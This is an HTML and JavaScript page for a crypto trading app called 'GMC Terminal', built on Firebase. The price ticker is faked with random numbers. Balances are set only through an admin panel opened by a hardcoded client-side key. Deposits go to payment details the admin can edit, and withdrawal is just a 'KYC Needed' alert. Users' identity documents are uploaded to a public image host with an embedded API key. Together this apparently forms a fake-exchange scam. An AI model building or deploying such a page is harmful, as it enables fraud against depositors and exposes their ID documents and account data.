<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GMC Terminal Official</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --neon: #00ff88; --dark: #05070a; }
        body { background: var(--dark); color: white; font-family: sans-serif; padding-bottom: 80px; }
        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; }
        .page { display: none; padding: 20px; }
        .active-page { display: block; }
        input { background: #000; border: 1px solid #333; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 10px; color: white; outline: none; }
        .btn-primary { background: var(--neon); color: black; font-weight: bold; padding: 12px; border-radius: 8px; width: 100%; cursor: pointer; border:none; }
        #admin-panel { display: none; position: fixed; inset: 0; background: #000; z-index: 200; overflow-y: auto; padding: 20px; }
    </style>
</head>
<body>

    <nav class="fixed bottom-0 left-0 w-full glass flex justify-around p-4 z-50 text-[10px] font-bold border-t border-gray-800">
        <button onclick="showPage('trade')">📊 TRADE</button>
        <button onclick="showPage('wallet')">💰 WALLET</button>
        <button onclick="showPage('kyc')">🆔 KYC</button>
        <button onclick="showPage('auth')" id="nav-auth-text">👤 LOGIN</button>
        <button onclick="openAdminPrompt()" class="text-gray-700">⚙️</button>
    </nav>

    <div id="admin-panel">
        <div class="flex justify-between mb-6">
            <h1 class="text-xl font-bold text-green-500 underline">GMC ADMIN COMMAND</h1>
            <button onclick="closeAdmin()" class="text-red-500 font-bold text-xl">X</button>
        </div>
        <div class="space-y-6">
            <div class="glass p-4">
                <h2 class="text-xs mb-2">SET DEPOSIT DETAILS</h2>
                <textarea id="admin-pay-input" class="w-full bg-black border border-gray-700 p-2 text-xs h-20" placeholder="JazzCash: 03xx..."></textarea>
                <button onclick="savePayment()" class="bg-blue-600 w-full p-2 mt-2 rounded text-xs">UPDATE DEPOSIT INFO</button>
            </div>
            <div class="glass p-4">
                <h2 class="text-xs mb-2">ADD BALANCE (GIVE UID)</h2>
                <input type="text" id="admin-uid" placeholder="User UID" class="text-xs">
                <input type="number" id="admin-bal" placeholder="New Balance" class="text-xs">
                <button onclick="saveBalance()" class="bg-green-600 w-full p-2 rounded text-xs text-black">UPDATE BALANCE</button>
            </div>
            <div class="glass p-4">
                <h2 class="text-xs mb-2">PENDING KYC</h2>
                <div id="admin-kyc-list" class="space-y-2 text-[10px]"></div>
            </div>
        </div>
    </div>

    <div id="deposit-modal" class="fixed inset-0 bg-black/90 z-[100] hidden flex items-center justify-center p-6">
        <div class="glass p-8 w-full max-w-sm text-center">
            <h2 class="text-green-500 font-bold mb-4">DEPOSIT FUNDS</h2>
            <div id="user-payment-info" class="bg-black/50 p-4 border border-gray-800 text-xs text-left text-green-400 whitespace-pre-line">Loading...</div>
            <button onclick="document.getElementById('deposit-modal').style.display='none'" class="mt-6 text-red-500 text-xs">CLOSE</button>
        </div>
    </div>

    <div id="auth" class="page active-page">
        <div id="login-box" class="glass p-8 mt-10">
            <h1 class="text-2xl font-black mb-6 text-green-400 text-center italic underline">GMC TERMINAL</h1>
            <input type="email" id="email" placeholder="Email">
            <input type="password" id="pass" placeholder="Password">
            <button id="auth-btn" class="btn-primary">LOGIN / REGISTER</button>
        </div>
        <div id="profile-box" class="glass p-8 mt-10 hidden text-center">
            <h2 class="text-xl font-bold text-green-400 mb-2 italic underline">PILOT PROFILE</h2>
            <p id="user-email" class="text-xs text-gray-500 mb-4"></p>
            <p id="user-uid-display" class="text-[9px] bg-black p-2 rounded text-gray-600 mb-6 font-mono"></p>
            <button id="logout-btn" class="w-full text-red-500 text-xs border border-red-900/30 p-2 rounded font-bold">LOGOUT</button>
        </div>
    </div>

    <div id="trade" class="page">
        <div class="flex justify-between mb-4"><h1 class="font-bold">GMC/USDT</h1><span id="price" class="text-green-400 font-mono text-sm">$1.2854</span></div>
        <div class="glass h-48 mb-4 overflow-hidden p-2">
            <div class="flex items-end h-full gap-1">
                <div class="bg-green-500/20 w-full" style="height:30%"></div>
                <div class="bg-green-500/40 w-full" style="height:60%"></div>
                <div class="bg-green-500/20 w-full" style="height:45%"></div>
                <div class="bg-green-500/60 w-full" style="height:80%"></div>
                <div class="bg-green-500/30 w-full" style="height:50%"></div>
                <div class="bg-green-500 w-full animate-pulse" style="height:90%"></div>
            </div>
        </div>
        <div class="glass p-4">
            <input type="number" id="t-price" placeholder="Limit Price">
            <input type="number" id="t-amt" placeholder="GMC Amount">
            <button id="trade-btn" class="btn-primary mt-2">EXECUTE BUY ORDER</button>
        </div>
    </div>

    <div id="wallet" class="page text-center">
        <div class="glass p-10 mb-6">
            <p class="text-[10px] text-gray-500 uppercase">Available Assets</p>
            <h1 class="text-5xl font-black mt-2 tracking-tighter">$<span id="balance">0.00</span></h1>
        </div>
        <div class="grid grid-cols-2 gap-4">
            <button onclick="document.getElementById('deposit-modal').style.display='flex'" class="glass p-6 text-xs font-bold border-green-900/30">📥 DEPOSIT</button>
            <button onclick="alert('KYC Needed')" class="glass p-6 text-xs font-bold">📤 WITHDRAW</button>
        </div>
    </div>

    <div id="kyc" class="page">
        <div class="glass p-6">
            <h2 class="text-green-500 font-bold mb-4">IDENTITY (KYC)</h2>
            <input type="file" id="kyc-file">
            <button id="kyc-btn" class="btn-primary mt-4">SUBMIT FOR REVIEW</button>
            <p id="kyc-status" class="text-xs mt-4 text-yellow-500 italic"></p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, serverTimestamp, doc, onSnapshot, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyD3H5aQHuX3RTdJgJnSZGYJCRmCI51Mvbg",
            authDomain: "coin-terminal.firebaseapp.com",
            projectId: "coin-terminal",
            storageBucket: "coin-terminal.firebasestorage.app",
            messagingSenderId: "673812925700",
            appId: "1:673812925700:web:680ce7d2706d4474941451"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        // Core UI Functions
        window.showPage = (id) => {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
            document.getElementById(id).classList.add('active-page');
        };

        // ADMIN FUNCTIONS
        window.openAdminPrompt = () => {
            if(prompt("Enter Admin Key:") === "786786") {
                document.getElementById('admin-panel').style.display = 'block';
                loadAdminData();
            }
        };
        window.closeAdmin = () => { document.getElementById('admin-panel').style.display = 'none'; };
        
        window.savePayment = async () => {
            const val = document.getElementById('admin-pay-input').value;
            await setDoc(doc(db, "settings", "payment_info"), { text: val });
            alert("Updated!");
        };

        window.saveBalance = async () => {
            const uid = document.getElementById('admin-uid').value;
            const bal = document.getElementById('admin-bal').value;
            await setDoc(doc(db, "users", uid), { balance: parseFloat(bal) }, {merge:true});
            alert("Balance Set!");
        };

        function loadAdminData() {
            onSnapshot(collection(db, "kyc"), (snap) => {
                const list = document.getElementById('admin-kyc-list');
                list.innerHTML = "";
                snap.forEach(d => {
                    list.innerHTML += `<div class="bg-black p-2 rounded">
                        Email: ${d.data().email} <br>
                        <a href="${d.data().url}" target="_blank" class="text-blue-400 underline">VIEW ID</a>
                        <button onclick="approveKYC('${d.id}')" class="ml-4 text-green-500">[APPROVE]</button>
                    </div>`;
                });
            });
        }

        // AUTH & LOGIC
        document.getElementById('auth-btn').onclick = async () => {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            try {
                await signInWithEmailAndPassword(auth, email, pass);
            } catch {
                await createUserWithEmailAndPassword(auth, email, pass);
            }
        };

        document.getElementById('logout-btn').onclick = () => signOut(auth);

        onAuthStateChanged(auth, user => {
            if(user) {
                document.getElementById('login-box').classList.add('hidden');
                document.getElementById('profile-box').classList.remove('hidden');
                document.getElementById('user-email').innerText = user.email;
                document.getElementById('user-uid-display').innerText = "UID: " + user.uid;
                onSnapshot(doc(db, "users", user.uid), (d) => {
                    if(d.exists()) document.getElementById('balance').innerText = d.data().balance.toFixed(2);
                });
            } else {
                document.getElementById('login-box').classList.remove('hidden');
                document.getElementById('profile-box').classList.add('hidden');
            }
        });

        // KYC UPLOAD
        document.getElementById('kyc-btn').onclick = async () => {
            const file = document.getElementById('kyc-file').files[0];
            if(!file) return alert("Select File");
            document.getElementById('kyc-status').innerText = "Uploading...";
            const fd = new FormData(); fd.append("image", file);
            const res = await fetch("https://api.imgbb.com/1/upload?key=a25b5bea8eb38a1ecf4f04154d85a4bf", {method: "POST", body: fd});
            const data = await res.json();
            if(data.success) {
                await addDoc(collection(db, "kyc"), { uid: auth.currentUser.uid, email: auth.currentUser.email, url: data.data.url, status: "Pending" });
                document.getElementById('kyc-status').innerText = "SUBMITTED!";
            }
        };

        // PRICE & PAYMENT SYNC
        onSnapshot(doc(db, "settings", "payment_info"), (d) => {
            if(d.exists()) document.getElementById('user-payment-info').innerText = d.data().text;
        });
        setInterval(() => {
            document.getElementById('price').innerText = "$" + (1.28 + Math.random()*0.05).toFixed(4);
        }, 3000);

    </script>
</body>
                    </html>
